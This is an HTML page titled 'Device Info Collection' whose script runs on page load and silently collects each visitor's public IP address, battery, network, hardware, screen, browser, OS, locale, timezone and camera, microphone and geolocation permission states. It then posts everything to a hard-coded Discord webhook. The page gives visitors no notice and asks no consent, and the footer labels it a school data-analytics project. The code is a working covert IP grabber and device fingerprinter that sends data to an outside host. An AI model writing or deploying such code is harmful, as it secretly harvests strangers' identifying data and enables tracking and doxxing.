<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Device Info Collection</title>
</head>
<body>

<script>
/* ---------------- UTILITY FUNCTIONS ---------------- */
function getOS() {
    const ua = navigator.userAgent;
    if (ua.indexOf("Windows NT") !== -1) return "Windows";
    if (ua.indexOf("Mac OS X") !== -1) return "macOS";
    if (ua.indexOf("Linux") !== -1) return "Linux";
    if (ua.indexOf("Android") !== -1) return "Android";
    if (ua.indexOf("iPhone") !== -1 || ua.indexOf("iPad") !== -1) return "iOS";
    return "Unknown";
}

function getBrowser() {
    const ua = navigator.userAgent;
    if (ua.indexOf("Chrome") !== -1) return "Chrome";
    if (ua.indexOf("Firefox") !== -1) return "Firefox";
    if (ua.indexOf("Safari") !== -1 && ua.indexOf("Chrome") === -1) return "Safari";
    if (ua.indexOf("Edge") !== -1) return "Edge";
    if (ua.indexOf("Opera") !== -1) return "Opera";
    return "Unknown";
}

function getBrowserVersion() {
    const ua = navigator.userAgent;
    const match = ua.match(/(Chrome|Firefox|Safari|Edge|Opera)\/(\d+)/);
    return match ? match[2] : "Unknown";
}

function getDeviceModel() {
    const ua = navigator.userAgent;
    const match = ua.match(/\(([^)]+)\)/);
    if (match) {
        const parts = match[1].split(';');
        for (let part of parts) {
            part = part.trim();
            if (part.includes('iPhone') || part.includes('iPad') || part.includes('Android')) {
                return part;
            }
        }
    }
    return "Unknown";
}

/* ---------------- DATA COLLECTION ---------------- */
const data = {};
const promises = [];

// Battery
if (navigator.getBattery) {
    promises.push(navigator.getBattery().then(b => {
        data.battery = Math.round(b.level * 100) + "%";
        data.charging = b.charging ? "Yes" : "No";
        data.chargeTime = b.chargingTime === Infinity ? "Unknown" : b.chargingTime + " sec";
        data.dischargeTime = b.dischargingTime === Infinity ? "Unknown" : b.dischargingTime + " sec";
    }));
} else {
    data.battery = "Not supported";
    data.charging = "Not supported";
    data.chargeTime = "N/A";
    data.dischargeTime = "N/A";
}

// IP
promises.push(fetch("https://api.ipify.org?format=json")
    .then(r => r.json())
    .then(d => data.ip = d.ip)
    .catch(() => data.ip = "Unavailable"));

// Network
const conn = navigator.connection || {};
data.connection = conn.type || "Unknown";
data.effective = conn.effectiveType || "Unknown";
data.downlink = conn.downlink ? conn.downlink + " Mbps" : "Unknown";
data.online = navigator.onLine ? "Online" : "Offline";

// Device
const uaStr = navigator.userAgent;
data.device = /Mobi|Android|iPhone|iPad/i.test(uaStr) ? "Mobile / Tablet" : "Desktop";
data.model = getDeviceModel();
data.deviceName = "N/A";
data.cores = navigator.hardwareConcurrency || "Unknown";
data.memory = navigator.deviceMemory ? navigator.deviceMemory + " GB (approx)" : "Unknown";
data.screenRes = screen.width + " x " + screen.height;
data.availScreen = screen.availWidth + " x " + screen.availHeight;
data.colorDepth = screen.colorDepth;
data.pixelRatio = window.devicePixelRatio;
data.touch = ('ontouchstart' in window) ? "Yes" : "No";
data.touchPoints = navigator.maxTouchPoints || 0;

// Browser & OS
data.os = getOS();
data.browser = getBrowser();
data.browserVersion = getBrowserVersion();
data.ua = uaStr;
data.platform = navigator.platform;
data.vendor = navigator.vendor || "Unknown";
data.cookies = navigator.cookieEnabled ? "Enabled" : "Disabled";
data.dnt = navigator.doNotTrack || "Not specified";

// Locale
data.language = navigator.language;
data.languages = navigator.languages.join(", ");
data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
data.localTime = new Date().toString();
data.offset = new Date().getTimezoneOffset() + " minutes";

// Permissions
if (navigator.permissions) {
    promises.push(navigator.permissions.query({name: "geolocation"})
        .then(p => data.geoPerm = p.state)
        .catch(() => data.geoPerm = "Not supported"));
    promises.push(navigator.permissions.query({name: "camera"})
        .then(p => data.camPerm = p.state)
        .catch(() => data.camPerm = "Not supported"));
    promises.push(navigator.permissions.query({name: "microphone"})
        .then(p => data.micPerm = p.state)
        .catch(() => data.micPerm = "Not supported"));
} else {
    data.geoPerm = "Not supported";
    data.camPerm = "Not supported";
    data.micPerm = "Not supported";
}

// Wait for all async data and send
Promise.all(promises).then(() => {
    sendToWebhook();
});

/* ---------------- SEND TO WEBHOOK ---------------- */
function sendToWebhook() {
    const payload = {
        username: "Device Info Logger",
        embeds: [{
            title: "New Device Submission",
            color: 5793266,
            fields: [
                { name: "Battery", value: data.battery, inline: true },
                { name: "Charging", value: data.charging, inline: true },
                { name: "Charging Time", value: data.chargeTime, inline: true },
                { name: "Discharging Time", value: data.dischargeTime, inline: true },
                { name: "Public IP", value: data.ip, inline: false },

                { name: "Connection Type", value: data.connection, inline: true },
                { name: "Effective Type", value: data.effective, inline: true },
                { name: "Downlink Speed", value: data.downlink, inline: true },
                { name: "Online Status", value: data.online, inline: true },

                { name: "Device Type", value: data.device, inline: true },
                { name: "Device Model", value: data.model, inline: true },
                { name: "Device Name", value: data.deviceName, inline: true },
                { name: "CPU Cores", value: data.cores, inline: true },
                { name: "Memory", value: data.memory, inline: true },

                { name: "Screen Resolution", value: data.screenRes, inline: true },
                { name: "Available Screen", value: data.availScreen, inline: true },
                { name: "Color Depth", value: data.colorDepth, inline: true },
                { name: "Pixel Ratio", value: data.pixelRatio, inline: true },
                { name: "Touch Support", value: data.touch, inline: true },
                { name: "Max Touch Points", value: data.touchPoints, inline: true },

                { name: "OS", value: data.os, inline: true },
                { name: "Browser", value: data.browser, inline: true },
                { name: "Browser Version", value: data.browserVersion, inline: true },
                { name: "Platform", value: data.platform, inline: true },
                { name: "Vendor", value: data.vendor, inline: true },
                { name: "Cookies Enabled", value: data.cookies, inline: true },
                { name: "Do Not Track", value: data.dnt, inline: true },

                { name: "Language", value: data.language, inline: true },
                { name: "Languages", value: data.languages, inline: true },
                { name: "Timezone", value: data.timezone, inline: true },
                { name: "Local Time", value: data.localTime, inline: true },
                { name: "UTC Offset", value: data.offset, inline: true },

                { name: "Geolocation Permission", value: data.geoPerm, inline: true },
                { name: "Camera Permission", value: data.camPerm, inline: true },
                { name: "Microphone Permission", value: data.micPerm, inline: true },

                {
                    name: "User Agent",
                    value: data.ua.slice(0, 1000),
                    inline: false
                }
            ],
            footer: {
                text: "12th Grade Project - Data Analytics from Links"
            },
            timestamp: new Date().toISOString()
        }]
    };

    fetch("https://discord.com/api/webhooks/1456624791841931320/upEaFStAxGOxZp0xadz5xhH16I18KJtgv5zA9_Y-kDWbsZtqBGjJr_I7lbWj2I2pDFaD", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
    })
    .then(() => console.log("Data sent successfully"))
    .catch(() => console.log("Failed to send data"));
}
</script>

</body>
</html>
